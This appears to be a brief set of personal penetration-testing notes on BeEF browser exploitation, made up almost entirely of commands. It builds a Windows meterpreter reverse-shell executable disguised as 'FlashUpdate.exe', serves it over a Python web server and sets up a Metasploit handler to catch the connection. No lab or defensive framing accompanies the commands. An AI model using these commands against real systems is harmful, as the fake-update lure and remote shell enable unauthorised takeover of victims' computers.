# BeEF for browser exploitation notes

setup a msfvenom payload and host it with python webserver

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<port> -f exe -o /tmp/FlashUpdate.exe
python3 -m http.server 
```

start handler

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP>
exploit
```

## Starting Beef

```
beef
```
